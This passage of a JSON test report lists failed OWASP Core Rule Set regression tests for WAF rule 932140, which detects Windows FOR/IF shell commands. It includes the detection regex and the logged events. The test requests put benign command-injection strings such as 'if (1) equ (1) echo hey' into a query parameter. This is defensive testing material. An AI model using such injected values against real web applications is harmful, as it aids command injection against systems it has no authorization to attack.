    "test" : {
      "test_id" : 101,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=IF++++NOT+red%3D%3D%3Dred++++++++++++++echo+test",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 102,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942120 - SQL Injection Attack: SQL Operator Detected", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 102,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=IF+%2FI+++++Red%3D%3Dred+++++++++++++++echo+test",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 103,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942100 - SQL Injection Attack Detected via libinjection", "phase=2 rule_id=942150 - SQL Injection Attack: SQL function name detected", "phase=2 rule_id=942410 - SQL Injection Attack", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 103,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=if+%281%29+equ+%281%29+echo+hey",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 104,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 104,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=if+not+%282+equ+2%29+echo+hey",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 105,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942120 - SQL Injection Attack: SQL Operator Detected", "phase=2 rule_id=942370 - Detects classic SQL injection probings 2/3", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 105,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=if+%22%25VAR%25%22%3D%3D%25%25A+do+echo+true",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
